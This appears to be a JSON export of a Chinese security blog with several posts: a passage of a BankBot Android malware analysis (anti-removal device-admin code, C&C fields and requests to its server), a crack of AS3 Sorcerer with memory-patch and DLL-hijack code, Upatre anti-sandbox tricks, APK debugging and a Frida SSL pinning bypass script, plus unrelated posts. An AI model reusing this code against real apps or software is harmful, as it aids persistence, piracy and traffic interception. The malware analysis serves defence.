权限这个一个非常流氓的做法，具体的做法是如下面的代码： 1234567891011121314151617181920212223242526272829303132public class AdRec extends DeviceAdminReceiver { public AdRec() { super(); } public CharSequence onDisableRequested(Context context, Intent intent) { new AppCrash().Register(context); if(Build$VERSION.SDK_INT &lt;= 0xA) { Intent v2 = new Intent(&quot;android.settings.SETTINGS&quot;); v2.setFlags(0x50000000); context.startActivity(v2); Intent v4 = new Intent(&quot;android.intent.action.MAIN&quot;); v4.addCategory(&quot;android.intent.category.HOME&quot;); v4.setFlags(0x10000000); context.startActivity(v4); return &quot;WARNING! Your device will now reboot to factory settings.\\n\\nClick \\&quot;Yes\\&quot; to erase your data and continue. \\&quot;No\\&quot; for cancel.&quot;; } context.startService(new Intent(context, ASec.class)); long v6 = 0x7D0; try { Thread.sleep(v6); } catch(InterruptedException v3) { v3.printStackTrace(); } return &quot;WARNING! Your device will now reboot to factory settings.\\n\\nClick \\&quot;Yes\\&quot; to erase your data and continue. \\&quot;No\\&quot; for cancel.&quot;; } ...} 重写 DeviceAdminReceiver 的 onDisableRequest 方法。使用 Thread.sleep 方法使用户无法操作界面，在此期间采取 Activity 切换的方法绕开取消激活的步骤。 这里出过几个问题， Backdoor.AndroidOS.Obad.a 使用的，在设备管理器中隐身 就是现在代码中所用到这个，目前在所有的Android 版本中存在。 界面劫持通过界面劫持，诱使用户将App设置为设备管理器。从下图中可以看见Continues按钮其实是设备管理器的激活按钮。 使用翠鸟对恶意样本进行检查的结果0x02 C&amp;C 协议分析Bankbot 以固定时间轮询的方式向C&amp;C服务器请求命令，命令的格式为json格式。从代码中可以得到json字段的信息。 123456789101112131415161718192021private static final String FIELD_ACTION = &quot;action&quot;;private static final String FIELD_CALL_LOG = &quot;call_log&quot;;private static final String FIELD_DATA = &quot;data&quot;;private static final String FIELD_HISTORY = &quot;browser_history&quot;;private static final String FIELD_ID = &quot;id&quot;;private static final String FIELD_IMEI = &quot;imei&quot;;private static final String FIELD_INTERCEPT = &quot;intercept&quot;;private static final String FIELD_MAYHEM = &quot;mayhem&quot;;private static final String FIELD_MESSAGE = &quot;prefix_1&quot;;private static final String FIELD_NEW_SERVER = &quot;server&quot;;private static final String FIELD_NUMBER_SEND_TO = &quot;number_1&quot;;private static final String FIELD_OPERATOR = &quot;op&quot;;private static final String FIELD_PHONE = &quot;phone&quot;;private static final String FIELD_POLL_INTERVAL = &quot;server_poll&quot;;private static final String FIELD_PREFIX = &quot;prefix&quot;;private static final String FIELD_REPORT_CALLS = &quot;calls&quot;;private static final String FIELD_SMS_HISTORY = &quot;sms_history&quot;;private static final String FIELD_SPAM = &quot;text_2&quot;;private static final String FIELD_STATUS = &quot;status&quot;;private static final String FIELD_URL_TO_SHOW = &quot;url&quot;;private static final String FIELD_VERSION = &quot;version&quot;; 请求注册返回报文 401 注册报文请求报文 1234567POST /p/gate.php HTTP/1.1Content-Length: 106Content-Type: application/x-www-form-urlencodedHost: quick-sshopping.comConnection: Keep-Aliveaction=reg&amp;imei=098767899076562&amp;phone=15802920457&amp;op=Android&amp;version=4.4.4%2C3.4.0-gd853d22&amp;prefix=12Jhw21 响应报文 12345678910111213HTTP/1.1 200 OKServer: nginx/1.8.0Date: Tue, 23 Feb 2016 07:25:21 GMTContent-Type: text/htmlTransfer-Encoding: chunkedConnection: keep-aliveX-Powered-By: PHP/5.5.3132000 获取命令1234567POST /p/gate.php HTTP/1.1Content-Length: 32Content-Type: application/x-www-form-urlencodedHost: quick-sshopping.comConnection: Keep-Aliveaction=poll&amp;imei=098767899076562 1234567891011HTTP/1.1 200 OKServer: nginx/1.8.0Date: Tue, 23 Feb 2016 07:25:30 GMTContent-Type: text/htmlTransfer-Encoding: chunkedConnection: keep-aliveX-Powered-By: PHP/5.5.310 返回的命令为json 格式，主要的指令有下面几个， 指令 含义 401 要求 bot 注册 call_log 获取电话记录, 发送到C&amp;C server sms_history 获取短信内容，发送到C&amp;C server browser_history 获取浏览器书签，发送到C&amp;C server url 访问url 链接 server 更换C&amp;C server intercept server_poll 更新从服务器获取命令的时间间隔 mayhem calls 监视服务了大半天，没有收到有效指令，看来不是特别活跃。 0x03清除这个App的清除非常费劲，原因就是注册为设备管理器的app不能卸载，而这个App又使诈不让我们取消设备管理器，估计只有root的机器会好处理一些。 0x04总结BankBot 样本，代码编写的相当规范，风格严谨，是正规程序员的作品。但行为非常流氓，很顽固，不容易清除。所以遇到申请device admin 权限的程序一定要小心谨慎，以免不良后果。而Android的界面劫持也是一个严重的问题，估计后续利用这些技术的恶意App的数量会越来越多。","link":"/cn/BankBot/"},{"title":"Linux 下使用百度网盘","text":"百度网盘在国内很大概率是绕不过去，稍大点文件都喜欢用百度网盘给下载地址。可是百度网盘下载是限速的，而且对 Linux 用户非常不友好，我的 Fedora 装上 rpm 包也用不了，直接崩溃，所以得想点其他办法。 1. 官方安装包 （不一定都能使用）官方提供了 deb 和 rpm 格式安装包 http://issuecdn.baidupcs.com/issue/netdisk/LinuxGuanjia/3.0.1/baidunetdisk_linux_3.0.1.2.rpmhttp://issuecdn.baidupcs.com/issue/netdisk/LinuxGuanjia/3.0.1/baidunetdisk_linux_3.0.1.2.deb 但是在 Fedora 安装后，会报错误。 2. BaiduPCS-Go （百度网盘客户端 - Go语言编写）https://github.com/iikira/BaiduPCS-Go 2.1 登录./BaiduPCS-Go login -bduss=xxxxx 2.2 设置并发1&gt; config set -max_parallel=50 2.3 下载1&gt; download xxxxx 3. 使用浏览器插件https://github.com/acgotaku/BaiduExporter.git 可以直接使用作者提供的打包好的插件, 直接安装即可。 https://github.com/acgotaku/BaiduExporter/blob/master/BaiduExporter.crx 这个插件将使用 aria2c 下载，使用得先准备一个可以使用的aria2c要让 aria2c 更好用一些，可以修改一下配置，配置文件可以参考 https://raw.githubusercontent.com/acgotaku/BaiduExporter/master/aria2c/aria2.conf","link":"/cn/BaiduNetdisk/"},{"title":"Android 获取进程的 backtrace 信息","text":"☆ 使用kill 发送 SIGNAL_QUIT这种方法只能用于zygote 的子进程 (比如所有的 app 进程, 都是由zygote fork 而来). 1234567891011121314151617181920212223242526272829303132333435363738# kill -3 pid# cat /data/anr/traces.txt...suspend all histogram: Sum: 290us 99% C.I. 2us-40us Avg: 14.500us Max: 40usDALVIK THREADS (12):&quot;Signal Catcher&quot; daemon prio=5 tid=2 Runnable | group=&quot;system&quot; sCount=0 dsCount=0 obj=0x32c070a0 self=0xaecca000 | sysTid=1918 nice=0 cgrp=bg_non_interactive sched=0/0 handle=0xb4406930 | state=R schedstat=( 228351607 17443703 83 ) utm=12 stm=9 core=0 HZ=100 | stack=0xb430a000-0xb430c000 stackSize=1014KB | held mutexes= &quot;mutator lock&quot;(shared held) native: #00 pc 00370e01 /system/lib/libart.so (_ZN3art15DumpNativeStackERNSt3__113basic_ostreamIcNS0_11char_traitsIcEEEEiPKcPNS_9ArtMethodEPv+160) native: #01 pc 0035046f /system/lib/libart.so (_ZNK3art6Thread4DumpERNSt3__113basic_ostreamIcNS1_11char_traitsIcEEEE+150) native: #02 pc 0035a373 /system/lib/libart.so (_ZN3art14DumpCheckpoint3RunEPNS_6ThreadE+442) native: #03 pc 0035af31 /system/lib/libart.so (_ZN3art10ThreadList13RunCheckpointEPNS_7ClosureE+212) native: #04 pc 0035b45f /system/lib/libart.so (_ZN3art10ThreadList4DumpERNSt3__113basic_ostreamIcNS1_11char_traitsIcEEEE+142) native: #05 pc 0035bb6f /system/lib/libart.so (_ZN3art10ThreadList14DumpForSigQuitERNSt3__113basic_ostreamIcNS1_11char_traitsIcEEEE+334) native: #06 pc 00333cb7 /system/lib/libart.so (_ZN3art7Runtime14DumpForSigQuitERNSt3__113basic_ostreamIcNS1_11char_traitsIcEEEE+74) native: #07 pc 0033b01d /system/lib/libart.so (_ZN3art13SignalCatcher13HandleSigQuitEv+928) native: #08 pc 0033b901 /system/lib/libart.so (_ZN3art13SignalCatcher3RunEPv+340) native: #09 pc 0003f45f /system/lib/libc.so (_ZL15__pthread_startPv+30) native: #10 pc 00019b43 /system/lib/libc.so (__start_thread+6) (no managed stack frames)&quot;main&quot; prio=5 tid=1 Native | group=&quot;main&quot; sCount=1 dsCount=0 obj=0x74abb2a0 self=0xb4d76500 | sysTid=1914 nice=0 cgrp=bg_non_interactive sched=0/0 handle=0xb6f3fb34 | state=S schedstat=( 76934470 21396828 203 ) utm=3 stm=3 core=0 HZ=100 | stack=0xbe55e000-0xbe560000 stackSize=8MB | held mutexes= native: #00 pc 00040894 /system/lib/libc.so (__epoll_pwait+20) native: #01 pc 00019e6f /system/lib/libc.so (epoll_pwait+26) ... 结果写在 /data/anr/traces.txt 文件中, anr 是 ANR(Application Not Response)的意思. https://android.googlesource.com/platform/art/+/android-7.1.1_r13/runtime/runtime.cc 1234567891011121314151617181920212223void Runtime::InitNonZygoteOrPostFork( JNIEnv* env, bool is_system_server, NativeBridgeAction action, const char* isa) {... // Create the thread pools. heap_-&gt;CreateThreadPool(); // Reset the gc performance data at zygote fork so that the GCs // before fork aren't attributed to an app. heap_-&gt;ResetGcPerformanceInfo(); if (!is_system_server &amp;&amp; !safe_mode_ &amp;&amp; (jit_options_-&gt;UseJitCompilation() || jit_options_-&gt;GetSaveProfilingInfo()) &amp;&amp; jit_.get() == nullptr) { // Note that when running ART standalone (not zygote, nor zygote fork), // the jit may have already been created. CreateJit(); } StartSignalCatcher(); // Start the JDWP thread. If the command-line debugger flags specified &quot;suspend=y&quot;, // this will pause the runtime, so we probably want this to come last. Dbg::StartJdwp();} 可以看出非zygote的进程都会启动 Signal Catcher的 线程. 123456789101112131415161718192021222324252627root@shamu:/ # ps -t 2089USER PID PPID VSIZE RSS WCHAN PC NAMEu0_a58 2089 386 1565280 53732 SyS_epoll_ b6cb0894 S com.hujiang.dict:pushserviceu0_a58 2092 2089 1565280 53732 do_sigtime b6cb0b68 S Signal Catcheru0_a58 2095 2089 1565280 53732 unix_strea b6cb194c S JDWPu0_a58 2096 2089 1565280 53732 futex_wait b6c875e8 S ReferenceQueueDu0_a58 2097 2089 1565280 53732 futex_wait b6c875e8 S FinalizerDaemonu0_a58 2099 2089 1565280 53732 futex_wait b6c875e8 S FinalizerWatchdu0_a58 2100 2089 1565280 53732 futex_wait b6c875e8 S HeapTaskDaemonu0_a58 2101 2089 1565280 53732 binder_thr b6cb09c0 S Binder_1u0_a58 2102 2089 1565280 53732 binder_thr b6cb09c0 S Binder_2u0_a58 2107 2089 1565280 53732 SyS_epoll_ b6cb0894 S Thread-123u0_a58 2108 2089 1565280 53732 futex_wait b6c875e8 S taskService-prozygote 自己没有该线程.root@shamu:/ # ps | grep -i zyroot 386 1 1528448 67416 poll_sched b6cb0a5c S zygote127|root@shamu:/ # ps -t 386USER PID PPID VSIZE RSS WCHAN PC NAMEroot 386 1 1528448 67416 poll_sched b6cb0a5c S zygoteroot 2203 386 1528448 67416 futex_wait b6c875e8 S ReferenceQueueDroot 2204 386 1528448 67416 futex_wait b6c875e8 S FinalizerDaemonroot 2205 386 1528448 67416 futex_wait b6c875e8 S FinalizerWatchdroot 2206 386 1528448 67416 futex_wait b6c875e8 S HeapTaskDaemon https://android.googlesource.com/platform/art/+/android-7.1.1_r13/runtime/signal_catcher.cc 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354...void SignalCatcher::Output(const std::string&amp; s) { if (stack_trace_file_.empty()) { LOG(INFO) &lt;&lt; s; return; }...void SignalCatcher::HandleSigQuit() { Runtime* runtime = Runtime::Current(); std::ostringstream os; os &lt;&lt; &quot;\\n&quot; &lt;&lt; &quot;----- pid &quot; &lt;&lt; getpid() &lt;&lt; &quot; at &quot; &lt;&lt; GetIsoDate() &lt;&lt; &quot; -----\\n&quot;; DumpCmdLine(os); // Note: The strings &quot;Build fingerprint:&quot; and &quot;ABI:&quot; are chosen to match the format used by // debuggerd. This allows, for example, the stack tool to work. std::string fingerprint = runtime-&gt;GetFingerprint(); os &lt;&lt; &quot;Build fingerprint: '&quot; &lt;&lt; (fingerprint.empty() ? &quot;unknown&quot; : fingerprint) &lt;&lt; &quot;'\\n&quot;; os &lt;&lt; &quot;ABI: '&quot; &lt;&lt; GetInstructionSetString(runtime-&gt;GetInstructionSet()) &lt;&lt; &quot;'\\n&quot;; os &lt;&lt; &quot;Build type: &quot; &lt;&lt; (kIsDebugBuild ? &quot;debug&quot; : &quot;optimized&quot;) &lt;&lt; &quot;\\n&quot;; runtime-&gt;DumpForSigQuit(os); if ((false)) { std::string maps; if (ReadFileToString(&quot;/proc/self/maps&quot;, &amp;maps)) { os &lt;&lt; &quot;/proc/self/maps:\\n&quot; &lt;&lt; maps; } } os &lt;&lt; &quot;----- end &quot; &lt;&lt; getpid() &lt;&lt; &quot; -----\\n&quot;; Output(os.str());}...while (true) { int signal_number = signal_catcher-&gt;WaitForSignal(self, signals); if (signal_catcher-&gt;ShouldHalt()) { runtime-&gt;DetachCurrentThread(); return nullptr; } switch (signal_number) { case SIGQUIT: signal_catcher-&gt;HandleSigQuit(); break; case SIGUSR1: signal_catcher-&gt;HandleSigUsr1(); break; default: LOG(ERROR) &lt;&lt; &quot;Unexpected signal %d&quot; &lt;&lt; signal_number; break; } }... 从源码中发现除了SIGQUIT 还可以发送 SIGUSR1 , 这个信号可以使进程java 虚拟机执行GC操作 kill -10 pid 1234void SignalCatcher::HandleSigUsr1() { LOG(INFO) &lt;&lt; &quot;SIGUSR1 forcing GC (no HPROF)&quot;; Runtime::Current()-&gt;GetHeap()-&gt;CollectGarbage(false);} ☆ 使用 debugged 命令行这种方法是全系统通用的, 可以用于非zygote的进程. 12Usage: -b [&lt;tid&gt;] -b dump backtrace to console, otherwise dump full tombstone file 通过 -b 参数指定进程pid, 即可. 12345678910111213141516171819202122232425262728293031323334353637383940414243# debuggerd -b 23850Sending request to dump task 23850.----- pid 23850 at 1970-01-27 03:57:11 -----Cmd line: /sbin/adbdABI: 'arm'&quot;adbd&quot; sysTid=23850 #00 pc 0002b158 /sbin/adbd #01 pc 0002467f /sbin/adbd #02 pc 00020854 [stack]&quot;adbd&quot; sysTid=23851 #00 pc 0002fd38 /sbin/adbd #01 pc 0002a501 /sbin/adbd #02 pc 0000000b &lt;unknown&gt;&quot;adbd&quot; sysTid=23852 #00 pc 0002b624 /sbin/adbd #01 pc 000106cf /sbin/adbd #02 pc 00010301 /sbin/adbd #03 pc 0002a613 /sbin/adbd #04 pc 00030283 /sbin/adbd&quot;adbd&quot; sysTid=23853 #00 pc 0002b628 /sbin/adbd #01 pc 00013999 /sbin/adbd #02 pc 000112ed /sbin/adbd #03 pc 000104e1 /sbin/adbd #04 pc 0002a613 /sbin/adbd #05 pc 00030283 /sbin/adbd&quot;adbd&quot; sysTid=23862 #00 pc 0002b888 /sbin/adbd #01 pc 0000a503 /sbin/adbd #02 pc 00009527 /sbin/adbd #03 pc 0002a613 /sbin/adbd #04 pc 00030283 /sbin/adbd----- end 23850 ----- ... ☆ java 代码中打印调用栈123456try { ... } catch (RemoteException e) { e.printStackTrace(); ... } ☆ C++代码中打印调用栈CallStack.cpp 123456789#include &lt;utils/CallStack.h&gt;int main() { android::CallStack stack; stack.update(); stack.dump(1); return 0;} Android.mk 123456789101112LOCAL_PATH:= $(call my-dir)include $(CLEAR_VARS)LOCAL_SRC_FILES:= CallStack.cppLOCAL_SHARED_LIBRARIES += libutilsLOCAL_LDLIBS += -ldl -lutilsLOCAL_CFLAGS := $(common_CFLAGS)LOCAL_MODULE := CallStackinclude $(BUILD_EXECUTABLE) 执行后显示类似下面的结果 12345root@shamu:/data/local/tmp # ./CallStack#00 pc 000006d1 /data/local/tmp/CallStack#01 pc 00017359 /system/lib/libc.so (__libc_init+44)#02 pc 0000074c /data/local/tmp/CallStack","link":"/cn/backtrace_in_android/"},{"title":"关于定投的一些思考","text":"定投只有在低估的时候买，当估值进入中位数以上就不要买了，同时定投标的的估值应该在历史底部区域。 定投的本质不是价值投资，而是相信估值回归中位数。 指数基金，周期性行业适合定投，比如券商，钢铁，煤炭。一般按时间定投，如果大幅下跌也要买。 总的来说定投属于策略型的投资方法，其实并不知道底和顶在哪里，通过拉长时间来降低持仓成本，因此定投成功的关键在于你的成本是否可以随着时间而降下来。从这点也可以分析出在底部区域定投比在顶部区域定投要好得多，这也就是第一条。 定投策略对历史的估值情况有很强的依赖，属于基于历史数据的统计分析，但是每一次的情况都不同，没有人可以保证历史一定会重演。定投也不是价值投资，没有护城河，只是相信均值回归，这是第二条。 巴菲特非常推荐标普500指数 (S&amp;P 500) 定投，指数基金最牛的地方是股票会定期调整，把好的股票加入进来，差的淘汰出去，相当于有人帮你选股了，另外足够分散，发生系统性风险的概率大幅降低。周期性行业则是爆发性很强，三年不开张，开张吃三年，容易在底部积累大量筹码，作为一个长期投资策略非常合适。","link":"/cn/Automatic_Investment_Plan/"},{"title":"AS3 Sorcerer 3.0 破解思路","text":"AS3 Sorcerer是一款flash action Script的商业反编译软件。 www.as3sorcerer.com 软件为Delphi编写，加了未知壳，使用PEID 0.94无法正确查出，使用核心扫描发现是 Delphi编写，这个软件有一个特点修改一个字节就报错。由于时间原因没有具体跟相关代码。 破解方法使用LPK.dll动态修改as3.exe内存达到破解目前，在Windows Xp下比较完美， 在Windows 7下已经无法通过LPK.dll进行DLL hijack，可以通过DLL注入达到同样的目的。 难点有几个，OD加载报错，attack也报错。使用海风月影的StrongOD可以正常attach。 OD 1.1目前最大的问题是插件冲突严重，安装了OllyAdv后，无法成功加载as3.exe. 遇上强壳时可以使用phantom的protect DRx，可以解决一下问题，总之要尽量避免冲突。 接下来的难点就是如何找到破解的关键点，进行内存patch。 使用OD查找字符串参考Unicode，搜索trial 12345006974C2 E8 65ABFDFF call 0067202C006974C7 84C0 test al, al006974C9 75 1C jnz short 006974E7006974CB B9 E4756900 mov ecx, 006975E4 ; e006974D0 BA 50766900 mov edx, 00697650 ;Sorry! 这里有个坑，在OD中看到的代码有可能不是最终运行的代码，只有真正在OD里断下，进 入程序领空后，看到的代码才是解密后的真正代码。这里在这里浪费了很多时间。换句 话说就是要先保证能调试起来，能调试能下断点基本就成功了一半。 上面的代码是非常经典的关键代码，主要处理了 0067202C让它返回1就OK了。F7跟进 123456780067202C - E9 EE9D1900 jmp 0080BE1F00672031 CC int300672032 CC int300672033 CC int300672034 CC int300672035 CC int300672036 CC int300672037 90 nop 进入就去一个jmp，后面的大段跳转非常多，跟踪困难。好在有很多int3，可以自己 写一段汇编代码解决。 123456780067202C 33C0 xor eax, eax0067202E 83C0 01 add eax, 0x100672031 90 nop00672032 90 nop00672033 90 nop00672034 90 nop00672035 90 nop00672036 C3 retn 核心代码 12345678910HANDLE handle = GetModuleHandle(NULL);int RVA = 0x67202C - 0x400000;int VA = int(handle) + RVA;unsigned char p405213[11] = { 0x33, 0xC0, 0x83, 0xC0, 0x01, 0x90, 0x90, 0x90, 0x90, 0x90, 0xC3};VirtualProtectEx(hProcess, (LPVOID)VA, 11, PAGE_EXECUTE_READWRITE, &amp;Oldpp);WriteProcessMemory(hProcess, (LPVOID)VA, p405213, 11, NULL); GetModuleHandle用于动态获取进程加载基址。 LPK.dllWindows 7 不能默认已经不能使用LPK.dll，必须导入下面注册表键值，重启电脑才能使用。 12345Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager] &quot;ExcludeFromKnownDlls&quot;=hex(7):6c,00,70,00,6b,00,2e,00,64,00,6c,00,6c,00,00,00,\\ 00,00","link":"/cn/AS3_Sorcerer_crack/"},{"title":"使用Android Studio 调试无源码apk程序","text":"Apk无源码调试的方法有很多，现在发现使用Android Studio 结合 JEB 感觉良好，主要是参考 http://www.jianshu.com/p/c7899e5ea182 这篇记录下了具体步骤。 1. 下载 smalideahttps://bitbucket.org/JesusFreke/smali/downloads/smalidea-0.03.zip 在Android studio的插件仓库中没有找到这个插件，需要下载本地安装File -&gt; Settings -&gt; Plugins -&gt; Install plugin from disk 选择下载的插件，重启后生效。 2. apktool 输出源码文件https://github.com/iBotPeaches/Apktool/releases/download/2.2.0/apktool_2.2.0.jar 1java -jar apktool_2.2.0.jar d -f xx.apk -o xx 如果正常的将输出 smali 源码文件 3. Android Studio 导入源码File -&gt; New -&gt; import project 选择刚才导出的xx文件夹 4. 增加Android Stuido的调试选项Android Studio 界面上选择 Run-&gt; Edit Configurations，点击+号，新建remote类型调试器，默认的监听端口为5005，如果默认端口被占用则需要修改端口号。 5. 以调试模式启动应用1adb shell am start -D -n aa.bb/.activity 进程将挂起，aa.bb是package name，.activity 是要启动的activity 一般指定MainAcvitiy即可 6. 建立调试通道1adb shell ps | grep aa.bb 获得调试进程的pid 1adb forward tcp:5005 jdwp:debug_process_pid 执行命令后，可以看到adb监听本地5005 端口。 12&gt; netstat -antp | grep 5005 tcp 0 0 127.0.0.1:5005 0.0.0.0:* LISTEN 4728/adb 7. 设置断点，调试点击源码左侧栏可以设置断点，点击工具栏上的debug （一个小虫的按钮），开始调试。在这个步骤上我遇上了一个错误。 java.io.IOException “handshake failed - connection prematurally closed” 这个错误是因为adb版本问题，取消Android内部的adb集成就可以了。具体方法是Tools -&gt; Android -&gt; Enable adb integration 取消掉前面的勾就可以了。 如果看到Connected to the target VM, address: ‘localhost:5005’, transport: ‘socket’ 就大功告成了。 8. 其他一些说明事项要调试apk程序是有一些要求的，下面几种情况可以调试apk程序。 /default.prop ro.debuggable=1 我的手机就属于这种情况 12getprop | grep ro.debug[ro.debuggable]: [1] APK 中AndroidManifest.xml 有这句 android:debuggable=true","link":"/cn/apk_debug/"},{"title":"一些反沙盒的新技术","text":"Upatre 使用了一些新的逃逸技术来逃逸动态沙盒引擎的检查，这些技巧都非常的简单，但是非常的有效果。事实上，VirusTotal上Upatre的检出率并不高，新变种出来基本都检测不出来，说明现在的恶意软件对付杀毒软件是越来越有办法了。 目前在恶意软件上加壳倒是越来越少了，因为加壳容易引起杀软引擎的注意，相反地目前的恶意软件大量使用边执行边修改自身代码的方法来躲避杀软，不执行的话看起来就像是一个正常的软件，而真正执行起来代码却全变了，这也算是一种进化。 下面说说两种最近遇到的沙盒逃逸的办法，样本md5: ac3558b973402ef6a27e03c391f20533 检查开机时间一般使用沙盒的分析引擎的做法都是安装一个全新的系统，做系统镜像。然后在检查的时候加载镜像，执行样本。而开机的时间往往都被忽略了，基本都不会超过10分钟。 Upatre 样本所采取的方法是利用GetTickCount 获取开机的毫秒数，当开机时间小于12分钟是就不执行恶意的行为。 12345678004013B3 BB D8FE0A00 MOV EBX,0AFED8004013B8 FF55 DC CALL DWORD PTR SS:[EBP-24] ; kernel32.GetTickCount004013BB 3BC3 CMP EAX,EBX004013BD 0F82 6F020000 JB 0040163200401632 6A 00 PUSH 000401634 FF55 F4 CALL DWORD PTR SS:[EBP-C] ; kernel32.ExitProcess 0xAFED8 是 720600毫秒 12分钟多一点，不到进程退出了。 检查鼠标位置Upatre样本使用的第二种沙盒逃逸的方法是检查鼠标位置的变化，动态沙盒分析系统大多是自动化的系统，也就是不使用鼠标，如果Upatre样本检查到鼠标的位置没有发生变化，同样不会执行恶意行为。 12345678910110040197C 8D85 04FFFFFF lea eax,dword ptr ss:[ebp-0xFC]00401982 50 push eax00401983 FF95 20FFFFFF call dword ptr ss:[ebp-0xE0] ; user32.GetCursorPos00401989 8D85 0CFFFFFF lea eax,dword ptr ss:[ebp-0xF4]0040198F 50 push eax00401990 FF95 20FFFFFF call dword ptr ss:[ebp-0xE0] ; user32.GetCursorPos00401996 8B85 04FFFFFF mov eax,dword ptr ss:[ebp-0xFC]0040199C 8B9D 0CFFFFFF mov ebx,dword ptr ss:[ebp-0xF4]004019A2 39D8 cmp eax,ebx004019A4 74 D6 je short 62.0040197C 只要鼠标一动就退出循环，继续往下执行。 总结最近出现的样本在反动态沙盒检测方面明显地进化了，针对性极强，不再局限于古老的IsDebuggerPresent，而是利用PEB检查CPU核数等技术办法来检测，沙盒对抗估技术在后面的日子里一定会更加迅速的进化。 致谢非常感谢西安研究中心的同事提供的样本，同时感谢同事lzx在样本分析时给予的大力支持。","link":"/cn/anti_sandbox/"},{"title":"Andorid 绕过 SSL Pinning 抓 https 报文","text":"SSL pinningSSL Pinning是一种防止中间人攻击的技术，主要机制是在客户端发起请求–&gt;收到服务器发来的证书进行校验，如果收到的证书不被客户端信任，就直接断开连接不继续请求。可以发现中间人攻击的要点是伪造了一个假的服务端证书给了客户端，客户端误以为真。解决思路就是，客户端也预置一份服务端的证书，比较一下就知道真假了。 SSL-pinning有两种方式：证书锁定（Certificate Pinning） 和公钥锁定（ Public Key Pinning）。 证书锁定需要在客户端代码内置仅接受指定域名的证书，而不接受操作系统或浏览器内置的CA根证书对应的任何证书，通过这种授权方式，保障了APP与服务端通信的唯一性和安全性，因此客户端与服务端（例如API网关）之间的通信是可以保证绝对安全。但是CA签发证书都存在有效期问题，缺点是在证书续期后需要将证书重新内置到APP中。 公钥锁定提取证书中的公钥并内置到客户端中，通过与服务器对比公钥值来验证连接的正确性。制作证书密钥时，公钥在证书的续期前后都可以保持不变（即密钥对不变），所以可以避免证书有效期问题，一般推荐这种做法。 （此小节内容摘抄自互联网） 总体思路使用 mitmproxy https://github.com/mitmproxy/mitmproxy 进行抓包，使用 frida 绕过 SSL pinning， frida 的安装和使用这里就不再详述了，可以参考其他资料。 安装 mitmproxy参考 https://docs.mitmproxy.org/stable/overview-installation/ 文档 可以直接下载 Linux binary： https://snapshots.mitmproxy.org/7.0.2/mitmproxy-7.0.2-linux.tar.gz， 或者使用 pip 进行安装 https://pypi.org/project/mitmproxy/执行命令 ~/.local/bin/pip3 install mitmproxy --user 安装成功之后，有三个程序可以使用： mitmproxy，mitmdump， mitmweb 设置代理在主机上执行下面几行命令设置代理 123mitmweb -p 8080adb shell settings put global http_proxy 127.0.0.1:8888adb reverse tcp:8888 tcp:8080 mitmweb -p 8080 在本机起 8080 代理，在 Android 上设置 http 全局代理 127.0.0.1:8888， 最后将 Android 的 8888 端口转发到本机 8080 端口 设置 CAhttps://docs.mitmproxy.org/stable/concepts-certificates/ 1The first time mitmproxy is run, it creates the keys for a certificate authority (CA) in the config directory (~/.mitmproxy by default). Filename Contents mitmproxy-ca.pem The certificate and the private key in PEM format. mitmproxy-ca-cert.pem The certificate in PEM format. Use this to distribute on most non-Windows platforms. mitmproxy-ca-cert.p12 The certificate in PKCS12 format. For use on Windows. mitmproxy-ca-cert.cer Same file as .pem, but with an extension expected by some Android devices. 我们是 Android 应该使用 mitmproxy-ca-cert.cer，在 Android 系统安装的话，需要点击 设置 -〉安全 -〉 加密与凭证 -〉安装证书 -〉CA 证书 使用 frida 绕过 SSL pinning使用 frida 脚本首先需要将 mitmproxy-ca-cert.cer 上传到 /data/local/tmp/cert-der.crt 使用脚本 https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566/* Android SSL Re-pinning frida script v0.2 030417-pier $ adb push burpca-cert-der.crt /data/local/tmp/cert-der.crt $ frida -U -f it.app.mobile -l frida-android-repinning.js --no-pause https://techblog.mediaservice.net/2017/07/universal-android-ssl-pinning-bypass-with-frida/ UPDATE 20191605: Fixed undeclared var. Thanks to @oleavr and @ehsanpc9999 !*/setTimeout(function(){ Java.perform(function (){ console.log(&quot;&quot;); console.log(&quot;[.] Cert Pinning Bypass/Re-Pinning&quot;); var CertificateFactory = Java.use(&quot;java.security.cert.CertificateFactory&quot;); var FileInputStream = Java.use(&quot;java.io.FileInputStream&quot;); var BufferedInputStream = Java.use(&quot;java.io.BufferedInputStream&quot;); var X509Certificate = Java.use(&quot;java.security.cert.X509Certificate&quot;); var KeyStore = Java.use(&quot;java.security.KeyStore&quot;); var TrustManagerFactory = Java.use(&quot;javax.net.ssl.TrustManagerFactory&quot;); var SSLContext = Java.use(&quot;javax.net.ssl.SSLContext&quot;); // Load CAs from an InputStream console.log(&quot;[+] Loading our CA...&quot;) var cf = CertificateFactory.getInstance(&quot;X.509&quot;); try { var fileInputStream = FileInputStream.$new(&quot;/data/local/tmp/cert-der.crt&quot;); } catch(err) { console.log(&quot;[o] &quot; + err); } var bufferedInputStream = BufferedInputStream.$new(fileInputStream); var ca = cf.generateCertificate(bufferedInputStream); bufferedInputStream.close(); var certInfo = Java.cast(ca, X509Certificate); console.log(&quot;[o] Our CA Info: &quot; + certInfo.getSubjectDN()); // Create a KeyStore containing our trusted CAs console.log(&quot;[+] Creating a KeyStore for our CA...&quot;); var keyStoreType = KeyStore.getDefaultType(); var keyStore = KeyStore.getInstance(keyStoreType); keyStore.load(null, null); keyStore.setCertificateEntry(&quot;ca&quot;, ca); // Create a TrustManager that trusts the CAs in our KeyStore console.log(&quot;[+] Creating a TrustManager that trusts the CA in our KeyStore...&quot;); var tmfAlgorithm = TrustManagerFactory.getDefaultAlgorithm(); var tmf = TrustManagerFactory.getInstance(tmfAlgorithm); tmf.init(keyStore); console.log(&quot;[+] Our TrustManager is ready...&quot;); console.log(&quot;[+] Hijacking SSLContext methods now...&quot;) console.log(&quot;[-] Waiting for the app to invoke SSLContext.init()...&quot;) SSLContext.init.overload(&quot;[Ljavax.net.ssl.KeyManager;&quot;, &quot;[Ljavax.net.ssl.TrustManager;&quot;, &quot;java.security.SecureRandom&quot;).implementation = function(a,b,c) { console.log(&quot;[o] App invoked javax.net.ssl.SSLContext.init...&quot;); SSLContext.init.overload(&quot;[Ljavax.net.ssl.KeyManager;&quot;, &quot;[Ljavax.net.ssl.TrustManager;&quot;, &quot;java.security.SecureRandom&quot;).call(this, a, tmf.getTrustManagers(), c); console.log(&quot;[+] SSLContext initialized with our custom TrustManager!&quot;); } });},0); 执行下面命令，绕过 SSL pinning 